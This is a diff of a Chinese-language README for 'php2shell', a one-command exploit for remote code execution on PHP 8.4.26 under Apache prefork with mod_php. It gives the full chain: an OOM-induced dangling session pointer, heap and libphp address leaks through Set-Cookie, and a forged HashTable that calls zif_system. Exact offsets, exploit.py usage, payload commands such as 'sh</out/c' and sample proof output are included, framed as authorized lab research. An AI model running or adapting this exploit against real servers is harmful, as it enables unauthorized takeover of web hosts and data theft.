@@ -1,196 +1,98 @@
-# php2shell：PHP 8.4.26 `session.upload_progress` 纯 HTTP ASLR 绕过实验
+# php2shell — PHP 8.4.26 session 漏洞复现
 
-本仓库记录在**授权实验环境**中，对 Debian 12 + Apache 2.4.68 prefork +
-mod_php + PHP 8.4.26（官方源码自编译、未打补丁）的一组漏洞复现与利用研究。
+在“完全远程、只用 HTTP、目标页面无 `session_start()`、不写任何目标侧 PHP”的约束下，用**一个 `exploit.py`** 打通 PHP 8.4.26 + Apache prefork + mod_php 的 RCE。当前版本要求 `display_errors=1`；`display_errors=0` 已打通纯 HTTP 堆泄漏，完整 RCE 稍后提交。
 
-> **复线声明**：本仓库全部成果均使用 **deepseek-v4-flash** 复线（复现验证）。
+## 机制概览
 
-## 快速复现
+漏洞面是 `session.upload_progress` 在 RINIT 之前触发的 session 初始化，以及 OOM bailout 后跨请求残留的悬空指针。
 
-以下命令在目标机（Apache/mod_php 本机）的仓库目录执行，脚本默认连接
-`127.0.0.1:8088`。no-ASLR 地址与各阶段偏移绑定本实验构建，换环境需重新校准。
+整条链的攻击流量全部是普通 multipart HTTP，目标页面只有 `<?php echo "OK\n"; ?>`：
+
+0. **worker 轮换**：`A_bigfields`（3MB 存活 POST 字段 + 12MB OOM）后紧跟一个会初始化 session 的 B，child 以 SIGABRT 退出；prefork fork 出的新 worker 继承相同的 libphp/chunk 映射。
+1. **堆泄漏**：A 用 1001 个字段触发 `max_input_vars` 警告（`display_errors=On` → `headers_sent=1`），`PHPSESSID=\x00` 生成新 id 并置 `send_cookie=1`，最后的 12MB 字段在 `php_session_initialize()` 内 OOM，`PS(http_session_vars)` 悬空。B 用 56B multipart 原始值缓冲区重占旧 reference，并用存活的 192B zend_string 承载 fake HashTable；`php_url_encode()` 越界读把 Zend MM chunk 指针写进 `Set-Cookie`（4096B、98 个指针）。
+2. **libphp 泄漏**：A 把悬空 `PS(id)` 放到 `chunk+0xb7400`；B 的 56B HashTable 页让 `ZSTR_LEN(PS(id))` 读到 `nTableSize=16`，数据区正好是 `nNextFreeElement|pDestructor`；`pDestructor = ZVAL_PTR_DTOR = libphp+0x613c50`，从 `Set-Cookie` 解出 libphp base。
+3. **命令执行**：A 用 6 个 pad 把悬空 reference 固定到 `R0=chunk+0x24e0`；B 用 55B raw buffer 覆盖 `R0-0x10`，fake HashTable 放在 `chunk+0x6e0d8` 的 167B 存活字符串里，`pDestructor = zif_system = libphp+0x43a870`。触发链：
+
+   ```text
+   php_session_track_init()
+     zval_ptr_dtor(PS(http_session_vars))
+       zend_reference_destroy(R0)
+         zval_ptr_dtor(&ref->val)          # IS_ARRAY_EX
+           zend_array_destroy(fake HT)
+             zend_hash_destroy(fake HT)
+               pDestructor(&bucket->val)   # zif_system
+   ```
+
+   终端只使用 libphp 内的 `zif_system`，不需要 libc。
+
+## 机制分析
+
+- **页面为什么不需要 `session_start()`**：A/B 的 session 初始化发生在 RINIT 前的 multipart 回调里（`FILE_START → php_session_rfc1867_update → php_session_initialize()`；`END → php_session_rfc1867_cleanup → php_session_initialize()`），与脚本内容无关。
+- **指针为什么会悬空**：A 在 `php_session_initialize()` 内 OOM bailout，`PS(http_session_vars)` / `PS(id)` 没有被清空；下一个请求初始化 session 时 `php_session_track_init()` 对它执行 `zval_ptr_dtor`。
+- **为什么能重占**：multipart 普通字段的值在请求解析阶段被分配成 zend_string；56B block、55B reference、167B 字符串这些尺寸正好覆盖旧 reference、承载 fake HashTable。
+- **为什么能过 ASLR**：两次 `Set-Cookie` 越界读分别给出 chunk base 和 libphp base；阶段之间用纯 HTTP abort/fork 换 worker，地址空间不变；终端不依赖 libc。
+- **历史线**：`session_unset()` + 用户态 `__destruct` 的 Defect D（`arData` UAF）已在自定义 PHP 页面取得 RCE（[NOASLR_REPORT.md](NOASLR_REPORT.md)），但违反“不写特定 PHP”约束，仅作机制参考。
+
+地址/偏移（相对 chunk 或 libphp，与 ASLR 无关）：
+
+| 位置 | 含义 |
+|---|---|
+| `chunk+0xb7400` | 阶段 2 悬空 `PS(id)` |
+| `chunk+0xb73f0` | 阶段 2 目标 HashTable（`a0443`） |
+| `chunk+0x6e0d8` | 阶段 3 fake HashTable 字符串数据 |
+| `chunk+0x24e0` | 阶段 3 悬空 reference `R0` |
+| `libphp+0x613c50` | `ZVAL_PTR_DTOR` |
+| `libphp+0x43a870` | `zif_system` |
+
+详细机制、gdb 证据与请求校准见 [HTTP_HEAP_LEAK.md](HTTP_HEAP_LEAK.md)（堆泄漏）、[ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md)（libphp 泄漏与全链）、[DISPLAY_ERRORS_OFF.md](DISPLAY_ERRORS_OFF.md)（不依赖 `display_errors` 的泄漏）、[NOTES.md](NOTES.md)（根因与源码位置）。
+
+## exp
+
+`exploit.py` 是一键入口：自动完成 worker 轮换、两阶段泄漏、`zif_system` 执行和 proof 读取，每个阶段内置重试。
+
+环境直接用 Docker 官方镜像，不在本地编译 PHP/Apache：
+
+| 组件 | 版本 | 来源 |
+|---|---|---|
+| PHP | 8.4.26（NTS，mod_php） | `php:8.4.26-apache` |
+| 基础系统 | Debian 12 (bookworm) | 同上 |
+| Apache | 2.4.62（Debian 12 包） | 同上 |
+| MPM | prefork，单 worker | [docker/apache.conf](docker/apache.conf) |
+| lab 报告中的 Apache | 2.4.68（原 lab 自编译） | 若需完全一致，用 [apache/httpd](https://github.com/apache/httpd) 的 2.4.68 tag |
+
+官方镜像仓库：[docker-library/php](https://github.com/docker-library/php)（Docker Hub: [`php:8.4.26-apache`](https://hub.docker.com/_/php)）；PHP 源码：[php/php-src](https://github.com/php/php-src)（tag `php-8.4.26`）。
 
 ```bash
-# 0) display_errors=0 一键链（只校验 display_errors=0，绝不修改配置；输出 chunk base）
-#    sshpass -p '<LAB_PASSWORD>' ssh -t <LAB_USER>@<LAB_HOST> 'bash ~/demo_de0_leak.sh'
-
-# 1) display_errors=0 手动分步（需 gdb；A-only 与 A+B forge）
-./tools/trial_bins.sh 0 62 235 15000 208 0 4000 103
-BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
-  ./tools/trial_ab.sh 0 62 235 15000 208 0 4000 103
-
-# 2) no-ASLR 纯 HTTP RCE（需 display_errors=On，两个请求）
-python3 tools/send_a_ps.py 17 19 3 12
-python3 tools/send_b_rce2.py 7 2 0x7ffff5e6e0d8 0x7ffff7d13490 "id>/tmp/p1"
-
-# 3) ASLR-on 全链（需 display_errors=On；demo_aslr_video.sh 会临时设置并恢复）
-CMD="id>/tmp/p1" bash tools/pure_aslr_run.sh
+docker compose -f docker/docker-compose.yml up -d
+python3 exploit.py -u http://127.0.0.1:8088/index.php
 ```
 
-> 步骤 3 的 `trial_*.sh` 会重启本机 Apache 并挂 gdb，仅用于校准/取证；
-> 实际攻击请求本身仍是普通 multipart HTTP。
-
-约束：
-
-- 攻击请求**只用普通 multipart HTTP**；
-- 目标 webroot 只有普通页面（`<?php echo "OK\n"; ?>`，无 session 调用），
-  **不放置任何目标相关 PHP 文件**；
-- 不依赖从目标读取 `/proc/self/maps`；
-- 所有命令执行/泄漏证据来自实验环境。
-
-> 仅用于授权环境中的漏洞研究与复现。请勿用于未授权系统。
-
----
-
-## 1. 结果摘要
-
-### 1.1 no-ASLR 纯 HTTP RCE（已完成）
-
-两个纯 HTTP 请求针对普通页面取得 `system()` 执行：
-
-- A：`session.upload_progress` 的 pre-RINIT 回调中 OOM，留下跨请求悬空的
-  `PS(http_session_vars)` reference；
-- B：用 56B multipart 原始值缓冲区重占旧 reference，伪造 reference →
-  HashTable → `pDestructor = system`，执行 `id>/tmp/p1`。
-
-详见 [NOASLR_REPORT.md](NOASLR_REPORT.md)。
-
-### 1.2 ASLR-on 纯 HTTP 全链（已完成，lab 5/5 / 9/10）
-
-- 阶段 1：悬空 `PS(id)` + `send_cookie=1`，让 pre-RINIT 的 `Set-Cookie`
-  通过 `php_url_encode` 做受控越界读，泄漏 Zend MM chunk base；
-- 阶段 2：把 `PS(id)` 放到目标 HashTable 前，读
-  `nTableSize|nInternalPointer` 和 `pDestructor=ZVAL_PTR_DTOR=libphp+0x613c50`，
-  泄漏 libphp base；
-- 阶段 3：`upload_progress` fake-ref → fake HashTable →
-  `pDestructor=zif_system`（libphp+0x43a870，不需要 libc），执行 `id>/tmp/p1`；
-- 阶段之间的 worker 轮换也改为纯 HTTP：`A_bigfields`（3MB 存活 POST 字符串 +
-  12MB OOM）后让下一个会初始化 session 的请求触发 `abort()`，prefork 重 fork
-  出 chunk/libphp 基址相同的新 worker。
-
-实测：ASLR 开启下无开局轮换 5/5，带开局轮换 9/10。
-
-详见 [ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md)、
-[HTTP_HEAP_LEAK.md](HTTP_HEAP_LEAK.md)。
-
-### 1.3 不依赖 `display_errors` 的堆泄漏（已完成）
-
-`display_errors=0` 时，警告不再产生输出，旧 A 依赖的
-`headers_sent=1 → send_cookie FAILURE → php_session_abort()` 路径消失。
-本仓库实现了替代原语：
-
-- A 把内存精确填到 `real_size = memory_limit` 且 bin 128 为空，
-  使 `php_session_send_cookie()` 内部 `php_url_encode()` 的
-  `zend_string_safe_alloc(3, 32, 0, 0)`（121B → bin 128）OOM；
-- OOM 发生在 `PS(send_cookie)=1` 之后，请求 bailout，留下悬空 `PS(id)`；
-- B 先穿过 A 遗留的悬空 `PS(mod_data)`（把 stale 页变成 SRUN 页），
-  再用两个大字段把 cached id chunk 铺到 page 510，使第二个字段的存活副本
-  覆盖 page 511 并写入伪造 `zend_string` 头（`len=4000`）；
-- `Set-Cookie` 解码后 4000 字节中有 47 个 chunk 内指针，可直接解出
-  Zend MM chunk base；`php_rshutdown_session_globals` 释放悬空 id 时也不再
-  panic。
-
-实测（配置已确认 `display_errors=0`）：no-ASLR **3/3**、ASLR-on **2/2**。
-
-详见 [DISPLAY_ERRORS_OFF.md](DISPLAY_ERRORS_OFF.md)。
-
-### 1.4 目标页面不需要 `session_start`（已验证）
-
-目标 `index.php` 仅为 `<?php echo "OK\n"; ?>`，没有任何 session 调用。
-session 由 `session.upload_progress` 的 pre-RINIT 回调初始化（A 的
-`FILE_START`、B 的 `MULTIPART_EVENT_END` cleanup），发生在脚本执行之前，
-因此与页面是否调用 `session_start()` 无关。`display_errors=0` 的 page-511
-forge 泄漏和旧 `display_errors=1` 阶段 1 泄漏都在该页面上成功（证据：
-`logs/nosession_forge_20261021.resp`、`logs/nosession_classic_leak_20261021.resp`）。
-
-
----
-
-## 2. 机制概览
+首次运行会自动执行 [docker/offsets.py](docker/offsets.py)：从容器内 `libphp.so` 读取 `zif_system` / `zval_ptr_dtor` 的真实偏移并写入 `out/offsets.env`，`exploit.py` 自动加载，所以更换官方镜像或升级后不用手改偏移。默认命令是 `id>/out/p1`（10 字节），容器里的 `/out` 挂载到仓库的 `./out`，proof 直接落在本机：
 
 ```text
-A  pre-RINIT upload_progress 回调 → php_session_initialize
-   ├─ 空 PHPSESSID → 生成随机 id + PS(send_cookie)=1
-   ├─ send_cookie 内部 url_encode 需要 bin 128
-   ├─ 堆被填满：free_pages=0 且 bin 128 空
-   └─ OOM bailout：PS(id) 悬空、send_cookie=1、mod_data 悬空、请求 teardown 跳过
-
-B  pre-RINIT MULTIPART_EVENT_END → php_session_rfc1867_cleanup
-   ├─ s_open：stale mod_data 的页被变成 SRUN → efree 不 panic
-   ├─ initialize 复用悬空 id → php_session_send_cookie
-   ├─ url_encode(PS(id)) 读取伪造 len：
-   │    stage 1: 页内 freelist 指针 → chunk base
-   │    stage 2: HashTable 的 pDestructor → libphp base
-   └─ 响应 Set-Cookie 携带泄漏
+[*] target http://127.0.0.1:8088/index.php (cmd='id>/out/p1')
+[*] no offsets file; reading libphp symbols from container php2shell-target
+zif_system     0x...
+zval_ptr_dtor  0x...
+[+] chunk base = 0x...
+[+] libphp base = 0x...
+[*] stage 3: HTDATA=0x... ZIF=0x...
+PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-终端使用 `zif_system`，只需要 chunk base + libphp base，不需要 libc。
-
----
-
-## 3. 目录
-
-| 路径 | 内容 |
-|---|---|
-| `NOASLR_REPORT.md` | no-ASLR 纯 HTTP RCE 报告 |
-| `ASLR_PATHS.md` | ASLR 两条路径的分析与阻塞点记录 |
-| `HTTP_HEAP_LEAK.md` | 纯 HTTP 堆泄漏（chunk base）机制/校准/证据 |
-| `ASLR_PURE_HTTP.md` | ASLR 全链（堆泄漏 → libphp 泄漏 → zif_system） |
-| `DISPLAY_ERRORS_OFF.md` | 不依赖 `display_errors` 的 OOM-in-cookie 与 page-511 forge |
-| `tools/` | 各阶段请求脚本、校准脚本、gdb 探针 |
-| `logs/` | 关键 gdb 轨迹与原始响应 |
-
-核心工具：
-
-- `tools/send_a_leak2.py` / `tools/b_numleak2.py`：阶段 1
-- `tools/send_a_leak3.py` / `tools/b_target.py`：阶段 2
-- `tools/send_a_pad.py` / `tools/send_b_zif.py`：阶段 3
-- `tools/send_a_bigfields.py` / `tools/sup_poc.py`：纯 HTTP worker 轮换
-- `tools/pure_aslr_run.sh`：全链驱动
-- `tools/send_a_oom5.py` / `tools/send_b_open.py`：`display_errors=0` 路径
-- `tools/trial_bins.sh` / `tools/trial_ab.sh` / `tools/g_bins.gdb`：校准与探针
-
----
-
-## 4. 复现说明
-
-这些脚本绑定本实验的 PHP 8.4.26 构建、`memory_limit=8M`、
-`session.save_handler=files`、单 worker prefork 和对应请求形状；
-换构建/配置/字段顺序需要重新标定偏移。
-
-所有 Python 脚本默认连接实验机本地的 `127.0.0.1:8088`，应在目标机上运行
-（或通过等价端口转发）。shell 脚本里的 `<LAB_HOST>` / `<LAB_PASSWORD>`
-是脱敏占位符，复现时请替换为你自己的授权环境配置；脚本默认 `sudo -n`
-可用。
-
-最短复现路径：
+payload 里的命令上限是 **14 字节**。要跑任意命令，把脚本写到挂载目录，再用 `sh</out/c`（8 字节）执行：
 
 ```bash
-# 阶段 1（旧 display_errors=On 链）
-python3 tools/send_a_leak2.py 1001 12
-python3 tools/b_numleak2.py 892 1 0x1000
-python3 tools/decode_leak.py /tmp/b_numleak2.resp
-
-# 不依赖 display_errors 的堆泄漏（需 gdb 校准；见 DISPLAY_ERRORS_OFF.md）
-./tools/trial_bins.sh 0 62 235 15000 208 0 4000 103
-BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
-  ./tools/trial_ab.sh 0 62 235 15000 208 0 4000 103
+printf 'id; uname -a > /out/p1\n' > out/c
+python3 exploit.py -u http://127.0.0.1:8088/index.php -c 'sh</out/c'
 ```
 
----
+常用参数：`--cmd`、`--proof-file`、`--fetch`、`--zif-offset`、`--dtor-offset`、`--htdata-offset`、`--no-pre-rotate`、`--retries`。远程目标默认使用 lab 偏移；`--offsets-file ''` 可关闭自动读取，容器名不是 `php2shell-target` 时用 `--docker-container` 指定。
 
-## 5. 限制与剩余工作
+## 复现声明
 
-- 所有偏移绑定本实验构建与请求形状，换环境需重新校准；
-- `display_errors=0` 路径目前完成了 **chunk base 泄漏**；
-  stage-2（libphp 泄漏）与 stage-3（`zif_system`）需要按新 A 形状重新标定，
-  详见 `DISPLAY_ERRORS_OFF.md` 第 6 节；
-- 旧链（display_errors=On）的全链与纯 HTTP 轮换已验证；
-- 泄漏/执行后 worker 可能按预期崩溃，这与一次利用的语义一致。
-
----
-
-## 6. 免责声明
-
-本项目仅用于授权环境中的漏洞研究、复现与防御验证。使用者应确保对目标
-系统拥有明确授权，并遵守当地法律法规。
+- **一个 exp 复现全部**：`python3 exploit.py -u ...` 一条命令完成 worker 轮换、堆泄漏、libphp 泄漏和 `zif_system` 执行；不需要目标侧文件、不需要 `session_start()`、不需要本地信号。
+- **纯 HTTP**：攻击流量只有 multipart POST，目标 webroot 只有 `<?php echo "OK\n"; ?>`。
+- **环境**：官方 `php:8.4.26-apache`（PHP 8.4.26 / Debian 12 / Apache 2.4.62 prefork）+ [docker/php.ini](docker/php.ini)、[docker/apache.conf](docker/apache.conf)。lab 报告中的 Apache 2.4.68 与官方镜像的差异：libphp 代码段偏移由 `docker/offsets.py` 自动读取；chunk 内偏移仍是 lab 校准值，必要时用 `--htdata-offset` 重新校准。
+- **边界**：当前 RCE 要求 `display_errors=1`、`memory_limit=8M`、`max_input_vars=1000`、`session.use_cookies=1`、`session.use_strict_mode=0`、单 worker prefork；`display_errors=0` 的完整 RCE 稍后提交。
+- 仅用于授权环境中的漏洞研究与复现。
